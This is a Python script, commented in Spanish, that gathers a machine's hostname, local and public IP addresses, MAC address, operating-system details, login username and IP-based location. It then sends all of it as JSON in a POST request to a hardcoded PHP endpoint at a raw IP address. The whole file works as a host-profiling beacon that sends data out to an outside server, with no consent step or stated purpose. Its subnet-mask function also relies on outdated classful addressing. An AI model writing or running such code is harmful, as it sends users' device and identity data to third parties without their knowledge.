import json
import socket
import requests
import platform
import os
from getmac import get_mac_address as gma

def obtener_nombre_del_host():
    try:
        host_name = socket.gethostname()
        return host_name
    except Exception as e:
        return f"No se pudo obtener el nombre del host: {str(e)}"

def obtener_direccion_ipv4():
    try:
        host_name = socket.gethostname()
        direccion_ip = socket.gethostbyname(host_name)
        return direccion_ip
    except Exception as e:
        return f"No se pudo obtener la dirección IPv4: {str(e)}"

def obtener_mascara_de_subred(ip):
    try:
        octetos_ip = [int(octeto) for octeto in ip.split('.')]
        
        if octetos_ip[0] >= 1 and octetos_ip[0] <= 126:
            mascara = "255.0.0.0"
        elif octetos_ip[0] >= 128 and octetos_ip[0] <= 191:
            mascara = "255.255.0.0"
        elif octetos_ip[0] >= 192 and octetos_ip[0] <= 223:
            mascara = "255.255.255.0"
        else:
            mascara = "Máscara de subred no definida para esta dirección IP"
        
        return mascara
    except Exception as e:
        return f"No se pudo obtener la máscara de subred: {str(e)}"

def obtener_direccion_ip_publica():
    try:
        respuesta = requests.get('https://api.ipify.org')
        direccion_ip = respuesta.text
        return direccion_ip
    except Exception as e:
        return f"No se pudo obtener la dirección IP pública: {str(e)}"

def obtener_direccion_mac():
    try:
        direccion_mac = gma()
        return direccion_mac
    except Exception as e:
        return f"No se pudo obtener la dirección MAC: {str(e)}"

def obtener_dns():
    try:
        configuracion_red = socket.getaddrinfo(socket.gethostname(), None)
        dns_ipv4 = [info[4][0] for info in configuracion_red if info[0] == socket.AF_INET]
        return dns_ipv4
    except Exception as e:
        return f"No se pudo obtener la configuración DNS: {str(e)}"

def obtener_sistema_operativo():
    try:
        sistema_operativo = platform.system()
        version = platform.version()
        plataforma = platform.platform()
        arquitectura = platform.architecture()
        return sistema_operativo, version, plataforma, arquitectura
    except Exception as e:
        return f"No se pudo obtener la información del sistema operativo: {str(e)}"

def obtener_pais():
    try:
        respuesta = requests.get('https://ipinfo.io/json')
        datos = respuesta.json()
        pais = datos.get('country')
        return pais
    except Exception as e:
        return f"No se pudo obtener el país: {str(e)}"

def obtener_region():
    try:
        respuesta = requests.get('https://ipinfo.io/json')
        datos = respuesta.json()
        region = datos.get('region')
        return region
    except Exception as e:
        return f"No se pudo obtener la región: {str(e)}"

def obtener_ciudad():
    try:
        respuesta = requests.get('https://ipinfo.io/json')
        datos = respuesta.json()
        ciudad = datos.get('city')
        return ciudad
    except Exception as e:
        return f"No se pudo obtener la ciudad: {str(e)}"

def obtener_zip():
    try:
        respuesta = requests.get('https://ipinfo.io/json')
        datos = respuesta.json()
        zip_code = datos.get('postal')
        return zip_code
    except Exception as e:
        return f"No se pudo obtener el código postal (ZIP): {str(e)}"

def obtener_isp():
    try:
        respuesta = requests.get('https://ipinfo.io/json')
        datos = respuesta.json()
        isp = datos.get('org')
        return isp
    except Exception as e:
        return f"No se pudo obtener el ISP: {str(e)}"

def obtener_timezone():
    try:
        respuesta = requests.get('https://ipinfo.io/json')
        datos = respuesta.json()
        timezone = datos.get('timezone')
        return timezone
    except Exception as e:
        return f"No se pudo obtener la zona horaria: {str(e)}"

def obtener_usuario():
    try:
        usuario = os.getlogin()
        return usuario
    except Exception as e:
        return f"No se pudo obtener el nombre de usuario: {str(e)}"




# URL del servidor PHP
url = 'http://100.77.20.157/hola.php'

# Datos que deseas enviar en formato JSON
datos = {
    "Nombre_del_host": obtener_nombre_del_host(),
    "Direccion_ipv4": obtener_direccion_ipv4(),
    "Mascara_de_subred": obtener_mascara_de_subred(obtener_direccion_ipv4()),
    "Direccion_ip_publica": obtener_direccion_ip_publica(),
    "Direccion_mac": obtener_direccion_mac(),
    "DNS": obtener_dns(),
    "Sistema_operativo": obtener_sistema_operativo(),
    "Pais": obtener_pais(),
    "Region": obtener_region(),
    "Ciudad": obtener_ciudad(),
    "ZIP": obtener_zip(),
    "ISP": obtener_isp(),
    "Timezone": obtener_timezone(),
    "Usuario": obtener_usuario()
}


# Convertir los datos a formato JSON
datos_json = json.dumps(datos)

# Encabezados de la solicitud
headers = {'Content-type': 'application/json'}

# Realizar la solicitud POST al servidor PHP
try:
    respuesta = requests.post(url, data=datos_json, headers=headers)
    if respuesta.status_code == 200:
        print("La solicitud se realizó correctamente.")
        print("Respuesta del servidor:")
        print(respuesta.text)
    else:
        print(f"Hubo un problema al realizar la solicitud. Código de estado: {respuesta.status_code}")
except Exception as e:
    print(f"Error al realizar la solicitud: {str(e)}")
